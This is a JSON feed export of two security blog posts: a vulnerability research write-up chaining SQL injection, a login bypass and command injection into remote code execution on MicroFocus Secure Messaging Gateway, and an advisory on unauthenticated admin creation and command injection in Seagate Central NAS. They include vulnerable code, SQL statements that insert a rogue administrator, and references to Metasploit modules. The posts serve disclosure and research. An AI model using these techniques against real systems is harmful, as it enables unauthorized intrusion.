{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-08-25 09:41:27","updatedTime":"2020-08-25 09:41:27","title":"Unexpected Journey #6 â€“ All ways lead to Rome ! Remote Code Execution on MicroFocus Secure Messaging Gateway","link":"https://pentest.blog/?p=1349","description":"<p>It has been a quite while since I haven&#8217;t released a new part of unexpected journey article serie. Particularly this small 0-day research project has been certainly didactic to me. Thus, I&#8217;ve decided to write down the process of achieving remote code execution on MicroFocus Secure Messaging Gateway product.<span id=\"more-1349\"></span></p>\n<p>Me and my team detects lots of security products during the OSINT phase of engagement. For whom haven&#8217;t heard of this <a href=\"https://pentest.blog/article-series/\">article series</a> before, I do pick a security products during OSINT, and then perform security research on them, finding 0-day so that we can break into targeted infrastructure. It&#8217;s all part of the penetration test process. <em>(Yeah, there is a huge difference between pentest and vulnerability assessment!)</em></p>\n<h3>All Ways Lead to ROME</h3>\n<p>During this security research, I&#8217;ve came across with more than 30+ vulnerability <em>(Remember pure native PHP projects like an early 2000, you know what I mean!)</em>. As far as I can tell, combination of these vulnerabilities can lead to 5 different RCE scenario.Â But from the point of aÂ <del>hacker</del> pentester perspective, I am not tasked to find out all vulnerabilities. I&#8217;m not tasked to uncover security issues of security products <em>(which I love to do this but our client&#8217;s concern was not that)</em>. All I need Â is to find a way to break in.</p>\n<h4>#Vulnerability 1 &#8211; SQL Injection is Everywhere ! But Choose One Wisely</h4>\n<p>As I told before, there was a multiple SQL Injection flaws. Here is the one obvious SQLi flaw that I&#8217;ve spotted at publicly accessible endpoint.</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"null\">// Lookup the database connection information for the QMS server\n$QmsQuery = \"SELECT DatabaseHost, DatabaseName, LoginName, LoginPassword FROM ServerModule \".\n            \"JOIN ModuleName ON ModuleName.idModuleName=ServerModule.idModuleName \".\n            \"JOIN ServerModuleDatabaseConnection ON ServerModuleDatabaseConnection.idServerModule=ServerModule.idServerModule \".\n            \"JOIN DatabaseConnection ON DatabaseConnection.idDatabaseConnection=ServerModuleDatabaseConnection.idDatabaseConnection \".\n            \"WHERE APIName='qms' AND idServer=\" . $_GET[ 'serverid' ] . \" AND idQuarantine=\" . $_GET[ 'qmsid' ] . \";\";\n$Result = pg_query( $dbconn, $QmsQuery );\nif ( pg_num_rows ( $Result ) &#62; 0 )\n{\n    $row = pg_fetch_row ( $Result );\t\n    $QmsDbConnectString = \"host=\" . $row[0] . \" dbname=\" . $row[1] . \" user=\" . $row[2] . \" password=\" .$row[3];\n    // ... OMITTED CODE ...\n}</pre>\n<p>What&#8217;s happening here is that application retrieves a data from database and then use it to dynamically generate Postgresql connection by using <code class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$QmsDbConnectString</code> variable.Â But the returned data from database, which can be manipulated by exploiting SQLi flaw, haven&#8217;t been used forÂ any context. For this reason, we need to use Time-based SQLi exploitation techniques. Beside that, Further investigation showed us thatÂ <strong>stacked-queries</strong> are enabled.</p>\n<p>Following items are important in terms of exploit development:</p>\n<ul>\n<li>Having a fully working exploit code (preferably msf module)</li>\n<li>Validity of actions in every step of exploitation</li>\n<li>Speed of exploitation process</li>\n</ul>\n<p>Even if we&#8217;re able to execute our own queries <em>(thanks to stacked-query)</em> Time-based SQL Injection is incapable of providing us the validity of taken actions reliably, such as user creation etc, as well as speed of exploitation and exploit code development<em> (Who wants to deal with a Time-based SQLi attacks during module development ?!! I&#8217;m certainly NOT) .</em></p>\n<p>I&#8217;ve kept reading source code while keeping these limitation in my mind and came across with following code block at /api/1/enginelist.php file.</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">&#60;?php\t\n  include_once( \"./api_support.php\" );\n\n  $AppKey = getAppKey();\t\n  $EngineArray = getEngineArray( $dbconn, $AppKey );\t// Get an ordered list of servers that can handle this request\n\n  if ( sizeof( $EngineArray ) &#62; 0 )\n  {\n    print( '&#60;?xml version=\"1.0\" encoding=\"UTF-8\"?&#62;' );\n    print( '&#60;response&#62;' );\n    print( '&#60;engines&#62;' );\n    foreach( $EngineArray As $Engine )\n    {\n      print( '&#60;engine&#62;' );\n      print( '&#60;host&#62;' . $Engine[0] . '&#60;/host&#62;' );\n      print( '&#60;description&#62;' . htmlspecialchars( $Engine[1], ENT_XML1 | ENT_COMPAT, 'UTF-8' ) . '&#60;/description&#62;' );\n      print( '&#60;priority&#62;' . $Engine[2] . '&#60;/priority&#62;' );\n      print( '&#60;/engine&#62;' );\n    }\n    print( '&#60;/engines&#62;' );\n    print( '&#60;/response&#62;' );\n  }\n  else\n  {\n    // No scan engine found (Possibly invalid AppKey or No scan engine connection address associated with this AppKey)\n    http_response_code( 401 );\t\t\n  }\n\n?&#62;\n</pre>\n<p>Here is the definition of two important function.</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">function getAppKey()\n{\n  $appkey = '';\n  if ( !empty( $_POST[ 'appkey' ] ) )\n  {\n    $appkey = $_POST[ 'appkey' ];\n  }\n  elseif ( !empty( $_GET[ 'appkey' ] ) ) \n  {\n    $appkey = $_GET[ 'appkey' ];\n  }\n  return $appkey;\n}\n\n\nfunction getEngineArray( $dbconn, $AppKey )\n{\n  // Lookup all the assigned servers\n  // connection address, engine name, priority, ssl\n  $EngineListQuery = \"SELECT DISTINCT ScanEngineProperty.ValueString || ComputeScanEnginePort( ScanEngineProperty.ValueString, coalesce( ScanEngineBindAddressPlain.ValueString, '' ), coalesce( ScanEngineBindAddressSsl.ValueString, '' ), coalesce( ScanEngineEnableSsl.ValueInt, 0 ) ) AS EngineAddr, \" .\n    \"ScanEngine.Description AS Description, \" .\n    \"coalesce(ScanEnginePropertyPriority.ValueInt,1)+coalesce(InterfaceEnginePriorityInfluence.Influence,0) AS Priority, \" .\n    \"coalesce( ScanEngineEnableSsl.ValueInt, 0 ) AS SslConnection FROM ScanEngineProperty \" .\n    \"JOIN ScanEngine ON ScanEngine.idScanEngine = ScanEngineProperty.idScanEngine \" .\n    \"JOIN ScanEngineOUSet ON ScanEngineOUSet.idScanEngine = ScanEngine.idScanEngine \" .\n    \"JOIN ScanEngineKey ON ScanEngineProperty.idKey = ScanEngineKey.idScanEngineKey \" .\n    \"LEFT JOIN ScanEngineProperty AS ScanEnginePropertyPriority ON ScanEnginePropertyPriority.idScanEngine=ScanEngineProperty.idScanEngine AND ScanEnginePropertyPriority.idKey=(SELECT idScanEngineKey FROM ScanEngineKey WHERE Value='FaultTolerancePriority') \" .\n    \"LEFT JOIN InterfaceEnginePriorityInfluence ON InterfaceEnginePriorityInfluence.idScanEngine=ScanEngine.idScanEngine AND InterfaceEnginePriorityInfluence.idInterface=(SELECT idInterface FROM InterfaceSetting WHERE Key='ApplicationKey' AND ValueString='\" . $AppKey . \"')\" .\n    \"LEFT JOIN ScanEngineProperty AS ScanEngineBindAddressPlain ON ScanEngineBindAddressPlain.idScanEngine=ScanEngineProperty.idScanEngine AND ScanEngineBindAddressPlain.idKey=(SELECT idScanEngineKey FROM ScanEngineKey WHERE Value='BindAddress') \" .\n    \"LEFT JOIN ScanEngineProperty AS ScanEngineBindAddressSsl ON ScanEngineBindAddressSsl.idScanEngine=ScanEngineProperty.idScanEngine AND ScanEngineBindAddressSsl.idKey=(SELECT idScanEngineKey FROM ScanEngineKey WHERE Value='BindAddressSsl') \" .\n    \"LEFT JOIN ScanEngineProperty AS ScanEngineEnableSsl ON ScanEngineEnableSsl.idScanEngine=ScanEngineProperty.idScanEngine AND ScanEngineEnableSsl.idKey=(SELECT idScanEngineKey FROM ScanEngineKey WHERE Value='EnableGWAVAServerSSL') \" .\n    \"WHERE ScanEngineOUSet.idOrganizationalUnit IN \" .\n    \"( \" .\n      \"SELECT idOrganizationalUnit FROM ScanEngineOUSet \" .\n      \"UNION \" .\n      \"SELECT idOrganizationalUnit FROM InterfaceOUSet WHERE InterfaceOUSet.Enabled=1 AND idInterface=(SELECT idInterface FROM InterfaceSetting WHERE Key='ApplicationKey' AND ValueString='\" . $AppKey . \"') \" .\n    \") \" .\n    \"AND ScanEngineKey.Value='ConnectionAddress';\";\n  $result = pg_query( $dbconn, $EngineListQuery );\n  $EngineArray = array();\n  if ( $result )\n  {\n    while ( $row = pg_fetch_row( $result ) )\n    {\n      array_push( $EngineArray, array( $row[0], $row[1], $row[2], $row[3] ) );\n    }\t\t\t\n    if ( sizeof( $EngineArray ) &#62; 0 )\n    {\n      usort( $EngineArray, 'CompareEngineRecords' );\n//\t\t\t\terror_log( 'After Engine Sort: ' . returnFormattedArray( $EngineArray ) );\n    }\n  }\n  return ( $EngineArray );\n}</pre>\n<p><code class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$AppKey</code> variable is being initiated with data taken by client. And the same variable is being passed to the <code class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">getEngineArray()</code> function which is using the same variable within SQL query. Yet anotherÂ obvious SQL Injection case. But this one is providing what exactly we need. If you look at the for loop you will see that result of the SQL query is being returned back to the client in the form of XML. Whenever we need to validate a one action taken during the exploitation, we could simply send one HTTP request to this vulnerable end-point by providing SQLi payload and then receive a HTTP response which contains a data returned from query !</p>\n<h4>Stacked Query is enabled. So what we are waiting for ?!</h4>\n<p>Once you have SQLi vulnerability with a stacked-query ability, there is lots of way to reach ROME. Here is some of the different routes to the ROME and the reason why I didn&#8217;t choose these path.</p>\n<ul>\n<li>What I want in the end is a fully automated single metasploit module that gives your remote shell. So dumping current users hash and then performing hash-cracking is off the table.</li>\n<li>This product is using Postgresql and we have stacked-query ability. So we could easily create a new table, and copy a content of a file into to that table as a record and read the data by select query. But Postgresql service is running with low-privileged user permission. All the configuration files and web folders are owned by root user. So we won&#8217;t be able to read content of any file.</li>\n<li>We could also create a file that contains our payload instead of reading any file but same limitations goes for this as well. All folders belongs to the root user and none of them have write permission for non-root user.</li>\n</ul>\n<p>For these reasons, I decided to go with a &#8220;create an administrator user&#8221; way. In order to do create user and then login with a newly created user, you need to fully understand login process. Following code snippet is responsible of login process.</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\" data-enlighter-highlight=\"33-37\">$result = pg_query($dbconn, \"SELECT Account.idAccount,PasswordStoreMethod.StoreMethod,Account.Enabled, ManagementMethod.ValueInt, COALESCE( ProvisionRefreshNextTimestamp.ValueInt, 0 ) - extract(epoch from now())::integer \" .\n    \"FROM Account \" .\n    \"JOIN PasswordStoreMethod ON PasswordStoreMethod.idPasswordStoreMethod=Account.idPasswordStoreMethod \" .\n    \"LEFT JOIN AccountProperty AS ManagementMethod ON ManagementMethod.idAccount=Account.idAccount AND ManagementMethod.Key='ManagementMethod' \" .\n    \"LEFT JOIN AccountProperty AS ProvisionRefreshNextTimestamp ON ProvisionRefreshNextTimestamp.idAccount=Account.idAccount AND ProvisionRefreshNextTimestamp.Key='ProvisionRefreshNextTimestamp' \" .\n    \"WHERE Account.LoginName ILIKE '\" . pg_escape_string( $_POST[ 'username' ] ) . \"'\");\n\nif ( !$result || pg_numrows( $result ) != 1 )\n{\n    $errcode = 49;\n}\nelse\n{\n    $row = pg_fetch_row( $result );\n    if ( $row[ 2 ] == 0 )\n    {\n        $errcode = 61;\n    }\n    else\n    {\n        $iManagementMethod = $row[ 3 ];\n        // If the user is managed by provisioning, check whether the password needs to be revalidated\n        if ( $iManagementMethod == 1 &#38;&#38; $row[ 4 ] &#60; 0 &#38;&#38; !isset( $_POST[ 'reentrant' ] ) )\n        {\n            $bRequireRevalidation = true;\n        }\n        else\n        {\n        \n            $UserID = $row[ 0 ];\n            $CurrentPasswordHashMethod = $row[ 1 ];\n\n            $HashedPassword = \"0\";\n            if ( $CurrentPasswordHashMethod == \"securemd5\" )\n            {\n                $HashedPassword = CreateEncryptedPassword( $_POST[ 'password' ], $UserID );\n            }\n\n            $LimitInterfaceClause = \"\";\n            \n            // Interface limit is passed in on second authentication attempt if user was presented with multiple options\n            if ( isset( $_POST[ 'LimitInterfaceId' ] ) &#38;&#38; $_POST[ 'LimitInterfaceId' ] != \"\" )\n            {\n                $LimitInterfaceClause = \" AND UserInterface.idUserInterface=\" . intval( $_POST[ 'LimitInterfaceId' ] ) . \" \";\n            }\n            \n            $result = pg_query($dbconn, \"SELECT DISTINCT UserInterface.idUserInterface,UserInterface.Path,UserInterface.RedirectButtonText,UserInterface.ButtonPresentationOrder,Account.idOwnerOU FROM OURoleSet \" .\n                \"JOIN RoleType ON RoleType.idRoleType=OURoleSet.idRoleType \" .\n                \"JOIN UserRole ON UserRole.idRoleType=RoleType.idRoleType AND UserRole.idAccount=\" . $UserID . \" \" .\n                \"JOIN OuRoleAssignedUserInterface ON OuRoleAssignedUserInterface.idOuRoleSet=OURoleSet.idOuRoleSet \" .\n                \"JOIN UserInterface ON UserInterface.idUserInterface=OuRoleAssignedUserInterface.idUserInterface \" .\n                \"JOIN Account ON Account.idAccount=UserRole.idAccount \" .\n                \"WHERE Account.Enabled=1 AND Account.Password='\" . pg_escape_string( $HashedPassword ) . \"' \" .\n                \"AND OURoleSet.idOU = Account.idOwnerOu \" .\n                $LimitInterfaceClause .\n                \"ORDER BY ButtonPresentationOrder;\" );\n\n            if ( !$result || pg_numrows( $result ) == 0 ){\n                // ... OMITTED CODE ...\n            }\n        }\n    }\n}</pre>\n<p>First of all, look at to the first line. Usage <code class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">ILIKE</code> instead of <code class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">=</code> operand gives us ability to complete login process just by knowing password. Use <code class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">a%</code> as a username and supply password of user contains <code class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">a</code> within it simply complete login ! But this bug useless for us of course. I want o have fully automated exploitation.</p>\n<p>What is very interesting in here is between lines 33-37. Here is what happens step by step.</p>\n<ol>\n<li>Find a user just by using username taken from client.</li>\n<li>Retrieve the data of that user from database.</li>\n<li>DetectÂ <code class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$CurrentPasswordHashMethod</code> of given user at line 31. <em>(Hint: HavingÂ CurrentPasswordHashMethod field in database means that they changed hashing algorithm in the past. They need to support older hashingÂ algorithm in terms of backward compatibility.)</em></li>\n<li>Set <code class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$HashedPassword</code> to zero (This will have a major role later !)</li>\n<li>If the user is being configuered to login by using Â <code class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">securemd5</code>Â , calculate the hash ! Otherwise <code class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$HashedPassword</code>Â will remain zero.</li>\n<li>Continue to login process by using given username and hashedpassword value.</li>\n</ol>\n<p>Now we need to understand <code class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">CreateEncryptedPassword</code> method. Here is the implementation of it.</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">function CreateEncryptedPassword( $_Password, $_UserId )\n{\n  global $g_PrivateKey;\n\n  // Take an MD5 hash from the original password\n  $HashedPassword = md5( $_Password );\n\n  // Append the private key and the login id to prevent duplicate hashes exposing matching passwords\n  $HashedPassword .= $g_PrivateKey;\n  $HashedPassword .= $_UserId;\n\n  // Rehash the joined hash\n  $HashedPassword = md5( $HashedPassword );\n\n  return ( $HashedPassword );\n}</pre>\n<p>We have salting operating in here. But problem isÂ Â <code class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$g_privateKey</code>Â value is being generated during installation and saved into the source.xml files. Since whole files of project owned by a root user. We are not be able to get the value by exploiting SQL Injection value. There is two way to continue to exploration. Either we need to find a way to read content of source.xml file or we need to find a way to bypass login process.</p>\n<p>Lets go back to login process and examine it closely. Here is the most interesting part !</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$HashedPassword = \"0\";\nif ( $CurrentPasswordHashMethod == \"securemd5\" )\n{\n  $HashedPassword = CreateEncryptedPassword( $_POST[ 'password' ], $UserID );\n}</pre>\n<p>What wouldÂ  happen if we changeÂ  <code class=\"EnlighterJSRAW\" data-enlighter-language=\"php\"> $CurrentPasswordHashMethod</code>Â to something else ?Â <code class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$HashedPassword</code>Â  will remain ZERO Â and then it will be used within another SQL query (line47) that validates password at database.</p>\n<p>Let me sum up what we&#8217;re going to do.</p>\n<ol>\n<li>We will create an user by exploiting SQL Injection issue.</li>\n<li>SinceÂ <code class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$CurrentPasswordHashMethod</code>Â variable is populated by idpasswordstoremethod field of new user. We can set it to anything we want !</li>\n<li>When the login process is being triggered for our user,Â <code class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$CurrentPasswordHashMethod</code>Â value will be different then the securemd5. Which causeÂ Â <code class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$HashedPassword</code>Â  remain as zero.</li>\n<li>When the query defined at Â 47th line executed, it will try to find a user that have zero as a password.</li>\n</ol>\n<p>Basically, we need to execute following series of query in order to complete login process with our newly created user without know what Â <code class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$g_privateKey</code>Â value is.</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"sql\">INSERT INTO account VALUES (1337, 1, 'hacker', '0', '', 1,1337);\nINSERT INTO UserRole VALUES (9999,1337,1),(9998,1337,2);</pre>\n<p>Isn&#8217;t that awesome ?!</p>\n<blockquote><p>Every software bug doesn&#8217;t mean you have a vulnerability. But under the rare conditions every bug can be useful.</p></blockquote>\n<h4># Vulnerability 2 &#8211; Authenticated Command Injection</h4>\n<p>Let me remind you one thing before continuing to the story. We were at the middle of the pentest. I don&#8217;t have days or weeks to spend on this product but only hours ! So I tried to find a shortest route to Rome. Following code sections are only accessible for a user who have certain Â privileges located at manage_domains_dkim_keygen_request.php file.</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\" data-enlighter-highlight=\"21,41\">&#60;?php \n\ninclude_once(\"../../../../http_cgi/security/clientsettings.php\");\n\n// Test rights to the provided record id\n$PermissionsOk = false;\n$result = pg_query( $dbconn, \"SELECT idOwnerOu FROM Domain JOIN DkimSignature ON DkimSignature.idDomain=Domain.idDomain WHERE idDkimSignature=\" . $_POST[ \"DkimRecordId\" ] );\nif ( $result &#38;&#38; $row = pg_fetch_row( $result ) )\n{\n    $PermissionsOk = CheckRightsToOu( $row[ 0 ] );\n}\n\nif ( !$PermissionsOk )\n{\n    // ... OMITTED CODE ...\n}\nelse\n{\n\n    // Retrieve the domain and selector for key generation\n    $result = pg_query( $dbconn, \"SELECT Domain,Selector FROM DkimSignature WHERE idDkimSignature=\" . $_POST[ \"DkimRecordId\" ] );\n    if ( $result &#38;&#38; $row = pg_fetch_row( $result ) )\n    {\n        $Domain = $row[ 0 ];\n        $Selector = $row[ 1 ];\n    }\n\n    if ( !isset( $Domain ) || !isset( $Selector ) )\n    {\n            // ... OMITTED CODE ...\n    }\n    else\n    {\n        // Generate directories for signature creation\n\n        $DkimSigningPath = realpath( $_SERVER['DOCUMENT_ROOT'] . \"/../http_local\" ) . \"/dkimsign/\";\n        @mkdir( $DkimSigningPath );\n        $DkimSigningPath .= $_POST[ \"DkimRecordId\" ] . \"/\";\n        @mkdir( $DkimSigningPath );\n\n        $SystemCommandResult = system( \"opendkim-genkey -b 2048 -r -s \" . $Selector . \" -d \" . $Domain . \" -D \" . realpath( $DkimSigningPath ) );\n\n        // ... OMITTED CODE ...;\n    }\n}\n?&#62;\n</pre>\n<p>We have another SQL Injection here but it&#8217;s not what we&#8217;re looking for. What particularly interesting for us is line 41. It does execute operating system command with a 2 dynamic variable <code class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$Selector</code> and <code class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$Domain</code>. Where are those variable are coming from ? yeah, they are coming from database. If we find a procedure that insert data into the DkimSignature table and the trigger this code section will give us a Command Injection ability !</p>\n<h3>Putting All Things Together</h3>\n<p>Let me sum up for readers who may be lost or couldn&#8217;t clearly understand what we&#8217;ve done so far.</p>\n<ol>\n<li>We detected unauthenticated SQLi but it&#8217;s useless in terms of certain rules.</li>\n<li>We detected another unauth SQLi which gives us ability to retrieve back the result of SQL query.</li>\n<li>We found a bug within login procedure which gives us ability to login without having private key that being used as a salt during login. (Set password field of any user to zero and change <code class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$CurrentPasswordHashMethod</code>Â to something else)</li>\n<li>We found authenticated command injection.</li>\n</ol>\n<h3>Metasploit Module</h3>\n<p>?<br />\n<a href=\"https://github.com/rapid7/metasploit-framework/pull/10255\">https://github.com/rapid7/metasploit-framework/pull/10255</a><br />\n<asciinema-player src=\"/wp-content/uploads/microfocus_rce.json\" cols=\"150\" rows=\"35\"></asciinema-player></p>\n<h3>Timeline</h3>\n<p>Congratulations to Micro Focus for their rapid response ! Here is the timeline of the process.</p>\n<ul>\n<li>19 June 2018 22:31 GMT +1 â€“ Finding 0day.</li>\n<li>19 June 2018 22:50 GMT +1 â€“ Implenetation of metasploit module.</li>\n<li>19 June 2018 23:03 GMT +1 â€“ Cyber intelligence sharing with <a href=\"https://www.prodaft.com/product/gpact/\">GPACT</a> customers.</li>\n<li>21 June 2018 23:59 GMT +1 â€“ First contact with vendor. We&#8217;ve told them that we are expecting to see hot-fix within 7 days.</li>\n<li>22 June 2018 00:02 GMT +1 â€“ Rapid response from vendor (not automatically generated:).</li>\n<li>22 June 2018 01:13 GMT +1 â€“ Vendor have confirmed of our finding.</li>\n<li>27 June 2018 00:13 GMT +1 â€“ Vendor issued CVE-2018-12464 and CVE-2018-12465.</li>\n<li>28 June 2018 20:09 GMT +1 â€“ Vendor released the fix.</li>\n<li>28 June 2018 20:09 GMT +1 â€“ We decided to withhold the publication of metasploit module for another 7 days. We want to give a enough time to companies who are currently using this product so they can update their systems.</li>\n</ul>\n","descriptionType":"html","publishedDate":"Thu, 21 Jun 2018 22:22:28 +0000","feedId":11893,"bgimg":"","linkMd5":"0006418a0a3060d49ab537a482f98c7b","bgimgJsdelivr":"","metaImg":"","author":"Mehmet Ince","publishedOrCreatedDate":1598319687289},{"createdTime":"2020-08-25 09:41:27","updatedTime":"2020-08-25 09:41:27","title":"Advisory | Seagate Central Storage Remote Code Execution 0day","link":"https://pentest.blog/?p=2407","description":"\n<p>In this article, I will be sharing  several critical vulnerabilities of Seagate Central Storage NAS product.</p>\n\n\n\n<span id=\"more-2407\"></span>\n\n\n\n<h3>Advisory Informations</h3>\n\n\n\n<p><strong>Remotely Exploitable:</strong>&#160;Yes<br><strong>Authentication Required:</strong>&#160;NO<br><strong>Vendor URL:</strong><a href=\"https://www.mailcleaner.net/\">&#160;</a><a href=\"https://www.seagate.com/as/en/support/external-hard-drives/network-storage/seagate-central/\">https://www.seagate.com/as/en/support/external-hard-drives/network-storage/seagate-central/</a><br><strong>Date of found:</strong>&#160;19 Dec 2019</p>\n\n\n\n<h3>Technical Details</h3>\n\n\n\n<p>Upon obtaining the latest device firmware from the <a href=\"https://www.seagate.com/as/en/support/external-hard-drives/network-storage/seagate-central/#downloads\">Seagate download page</a> i have started analyzing the firmware ZIP file. Inside the ZIP file there was another compressed binary with the name <code>Seagate-HS-update-201509160008F.img</code> by simply changing the file extension to &#8220;tar.gz&#8221; i was able to extract the  <a href=\"https://en.wikipedia.org/wiki/SquashFS\">SquashFS</a> file system that contained the management application source code, start-up scripts and busy-box binaries for the ARM based NAS device. </p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://pentest.blog/wp-content/uploads/screenshot_5.png\" alt=\"\" class=\"wp-image-2416\"/><figcaption>Contents of the firmware update ZIP file</figcaption></figure>\n\n\n\n<p>With using the <code>sudo unsquashfs -f -d /media/seagate /tmp/file.squashfs</code> command i have mounted the file system and started analyzing the contents. After a brief  reconnaissance i found the PHP source code for the device management interface and jumped right into the source code analysis phase.  During the analysis i noticed that the application was developed using the CodeIgniter framework. Considering the size of the management application i directly started tracing the most vulnerable PHP functions. I have used <code>find . -name \"*.php\" | xargs grep \"&#60;function-name&#62;\"</code> command for the following list of functions and got several  interesting input vectors.</p>\n\n\n\n<ul><li>exec</li><li>shell_exec</li><li>system</li><li>passthru</li><li>pcntl_exec</li><li>popen</li><li>proc_open</li><li>eval</li><li>preg_replace (with /e modifier)</li><li>create_function</li><li>file_get_contents</li><li>file_put_contents</li><li>readfile</li><li>include</li><li>require</li><li>require_once</li><li>include_once</li></ul>\n\n\n\n<p>One of the grep result for &#8220;proc_open&#8221; showed a call with several dynamic variables used as parameter inside the  <code>./cirrus/application/helpers/mv_backend_helper.php</code> file. </p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://pentest.blog/wp-content/uploads/screenshot.png\" alt=\"\" class=\"wp-image-2417\"/></figure>\n\n\n\n<p>Subject function is called inside the <strong>mv_backend_launch</strong> function witch is also located inside the <code>./cirrus/application/helpers/mv_backend_helper.php</code> file.  </p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">function mv_backend_launch($cmd, $noLog = false)\n{\n    $desc = array(\n            0 => array(\"pipe\",\"r\"),\n            1 => array(\"pipe\",\"w\"),\n            2 => array(\"pipe\",\"w\")\n            );\n    $cwd = './';\n\n    $process = proc_open($cmd,$desc,$pipes,$cwd);\n\n    if(is_resource($process))\n    {\n        fclose($pipes[0]);\n        $data =stream_get_contents($pipes[1]);\n        fclose($pipes[1]);\n        $errors=stream_get_contents($pipes[2]);\n        if(strlen(trim($errors))>0)\n            mv_log_errors($cmd,$errors);\n        fclose($pipes[2]);\n        proc_close($process);\n        \n        if ( ! $noLog ) {\n            syslog(LOG_INFO, \"CMD: '$cmd', RESPONSE: '$data'\");\n        }\n        return $data;\n    }\n}</pre>\n\n\n\n<p>After tracing back the function references i was able to detect <strong>check_device_name</strong> function witch was passing a unsanitized user input into the <strong>mv_backend_launch</strong> function with the <code>$name</code> parameter.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">    public function check_device_name()\n    {\n        $info = $this->get_start_info();\n        $isStart = $info &#38;&#38; array_key_exists('state', $info) &#38;&#38; $info['state'] == 'start';\n        \n        if ( ! $isStart ) {\n            mv_is_admin();\n        }\n        \n        $name = $this->input->post(\"name\");        \n        $result = mv_backend_launch(\"check_netbios_name.sh $name\");\n        \n        echo header('Content-type: text/xml');\n        echo $result;\n    }</pre>\n\n\n\n<p>Here at this point we have ourselves a function with remote code execution vulnerability. But the problem was this function only works if the device state is set to &#8220;start&#8221; or else it requires admin level access to the application. So we either need to find a way to change the device state without authentication or bypass authentication and escalate privileges.  Because of this issue i went back to analyzing the source code and found a even better attack vector. When analyzing the the device state mechanics i noticed that when the device is in &#8220;start&#8221; state it allows the registration of new users in order to perform initial setup of the device.  When i look for the how the state change operation is performed i found the <code>set_start_info</code> function inside the <code>application/core/MV_BaseController.php</code> file. This functions sets the device state with a JSON post request and gues what? there is no any kind of control <img src=\"https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png\" alt=\"ðŸ™‚\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /></p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">    public function reset_start_info()\n    {\n        self::save_object_to_file(null, self::START_FILE);\n        $uri = $_SERVER['REQUEST_URI'];\n        $idx = strpos($uri, 'index.php');\n        if ( $idx !== false ) {\n            $uri = substr($uri, 0, $idx);\n        }\n        $uri .= 'index.php/SCSS';\n        header('Content-type: text/plain');\n        header(\"Location: \".$uri, TRUE, 302);\n        exit();\n    }</pre>\n\n\n\n<p> So by simply changing the device state to &#8220;start&#8221; we are able to add a new admin user to the device. Users inside the device are created as a Linux system user thus they all have SSH access to the device. </p>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter is-resized\"><img src=\"https://pentest.blog/wp-content/uploads/source.gif\" alt=\"\" class=\"wp-image-2429\" width=\"452\" height=\"298\"/></figure></div>\n\n\n\n<h2>Metasploit Module</h2>\n\n\n\n<p>Up until this point we have identified multiple vulnerabilities. For the exploit code i prefer to use the second way witch we add a new admin user for establishing SSH connection. Because triggering reverse/bind shell connections with busybox binaries is hard in terms of Metasploit payload compatibility. Also by default device ports are closed except common services such as HTTP,HTTPS,SSH,FTP&#8230; Since the SSH is enabled by default and it is not possible to disable it using the administrator interface writing the exploit with the second way is the obvious choice. And here is the end result&#8230;</p>\n\n\n\n<asciinema-player src=\"/wp-content/uploads/seagate-poc.json\" cols=\"150\" rows=\"35\"></asciinema-player>\n\n\n\n<p>After reporting this vulnerability to Seagate we were very frustrated with the response. They first claimed that &#8220;this product was designed and targeted for personal home use within a personal LAN&#8221; thus has no real attack surface. But then we proved othervise by providing the number of exploitable devices open to internet using services such as <a href=\"https://www.shodan.io/\">shodan.io</a> and <a href=\"https://censys.io/\">censys.io</a>. But it seems they just don&#8217;t care Â¯\\_(ãƒ„)_/Â¯ We had no expectation of any kind of bounty or points we just wanted to write a cool blog post, the only reason for using Bugcrowd platform was, Seagate is only accepting bug reports by a <a href=\"https://www.seagate.com/as/en/legal-privacy/responsible-vulnerability-disclosure-policy/\">external Bugcrowd submission</a> form. </p>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large\"><img 